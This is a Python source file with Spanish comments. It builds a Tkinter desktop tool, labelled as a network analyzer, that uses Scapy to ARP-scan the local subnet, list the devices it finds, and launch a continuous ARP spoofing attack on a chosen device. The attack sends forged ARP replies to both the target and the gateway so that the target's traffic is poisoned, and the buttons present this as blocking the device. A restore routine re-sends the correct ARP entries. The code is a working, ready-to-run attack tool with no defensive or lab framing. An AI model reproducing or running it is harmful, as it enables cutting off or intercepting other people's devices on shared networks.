import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, srp, send
import threading
import uuid
import time

# Configuración inicial
ip_puerta_enlace = "192.168.1.1"  # Tu puerta de enlace
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
ataque_en_curso = False
dispositivos_detectados = []

# Función para obtener la MAC de un dispositivo
def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc
    return None

# Función para escanear la red y encontrar dispositivos
def escanear_red():
    global dispositivos_detectados
    widget_salida.insert(tk.END, "Iniciando escaneo de red...\n")
    rango_ip = "192.168.1.0/24"  # Rango de tu red local
    widget_salida.insert(tk.END, f"Escaneando rango: {rango_ip}\n")
    
    solicitud_arp = ARP(pdst=rango_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    
    try:
        widget_salida.insert(tk.END, "Enviando paquetes ARP...\n")
        resultado = srp(paquete, timeout=3, verbose=0)[0]
        widget_salida.insert(tk.END, f"Dispositivos encontrados: {len(resultado)}\n")
        
        dispositivos_detectados = []
        for enviado, recibido in resultado:
            dispositivo = {"ip": recibido.psrc, "mac": recibido.hwsrc}
            dispositivos_detectados.append(dispositivo)
            widget_salida.insert(tk.END, f"Encontrado: IP {recibido.psrc} - MAC {recibido.hwsrc}\n")
        
        actualizar_lista_dispositivos()
    except Exception as e:
        widget_salida.insert(tk.END, f"Error durante el escaneo: {str(e)}\n")
    
    widget_salida.see(tk.END)

# Actualizar la lista en la interfaz
def actualizar_lista_dispositivos():
    lista_dispositivos.delete(0, tk.END)
    for dispositivo in dispositivos_detectados:
        lista_dispositivos.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")

# Función para iniciar el ataque ARP spoofing
def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC de {ip_objetivo}.\n")
        return

    widget_salida.insert(tk.END, f"MAC objetivo {ip_objetivo}: {mac_objetivo}\n")
    
    respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
    respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

    while ataque_en_curso:
        send(respuesta_arp_objetivo, verbose=0)
        send(respuesta_arp_puerta, verbose=0)
        widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
        widget_salida.see(tk.END)
        time.sleep(2)

# Función para restaurar la conexión del dispositivo
def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)
    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst=mac_puerta, psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)

# Funciones de la interfaz gráfica
def iniciar_spoofing():
    global ataque_en_curso
    ip_objetivo = obtener_ip_seleccionada()
    if ip_objetivo:
        widget_salida.delete(1.0, tk.END)
        ataque_en_curso = True  
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, widget_salida), daemon=True)
        hilo.start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)

def desbloquear_dispositivo():
    ip_objetivo = obtener_ip_seleccionada()
    if ip_objetivo:
        restaurar_conexion(ip_objetivo)
        widget_salida.insert(tk.END, f"Conexión restaurada para {ip_objetivo}.\n")

def obtener_ip_seleccionada():
    seleccion = lista_dispositivos.curselection()
    if seleccion:
        return dispositivos_detectados[seleccion[0]]["ip"]
    else:
        messagebox.showwarning("Selección necesaria", "Seleccione un dispositivo de la lista.")
        return None

# Crear la ventana principal
ventana = tk.Tk()
ventana.title("Analizador de Red")
ventana.geometry("600x800")  # Tamaño inicial de la ventana

# Frame principal con padding
frame_principal = tk.Frame(ventana, padx=10, pady=10)
frame_principal.pack(fill=tk.BOTH, expand=True)

# Botón de escaneo
tk.Button(frame_principal, text="Escanear Red", command=escanear_red, 
          bg="#4CAF50", fg="white", pady=5).pack(fill=tk.X, pady=(0, 5))

# Lista de dispositivos con título
tk.Label(frame_principal, text="Dispositivos detectados:", anchor="w").pack(fill=tk.X, pady=(5, 0))
lista_dispositivos = tk.Listbox(frame_principal, width=50, height=10)
lista_dispositivos.pack(fill=tk.X, pady=(0, 5))

# Frame para los botones de control
frame_botones = tk.Frame(frame_principal)
frame_botones.pack(fill=tk.X, pady=5)

# Botones de control
tk.Button(frame_botones, text="Iniciar Bloqueo", command=iniciar_spoofing,
          bg="#2196F3", fg="white").pack(side=tk.LEFT, expand=True, padx=2)
tk.Button(frame_botones, text="Detener Bloqueo", command=detener_spoofing,
          bg="#f44336", fg="white").pack(side=tk.LEFT, expand=True, padx=2)
tk.Button(frame_botones, text="Desbloquear", command=desbloquear_dispositivo,
          bg="#FF9800", fg="white").pack(side=tk.LEFT, expand=True, padx=2)

# Área de salida con título
tk.Label(frame_principal, text="Registro de eventos:", anchor="w").pack(fill=tk.X, pady=(5, 0))
widget_salida = scrolledtext.ScrolledText(frame_principal, width=60, height=15)
widget_salida.pack(fill=tk.BOTH, expand=True)

# Iniciar el loop principal
ventana.mainloop()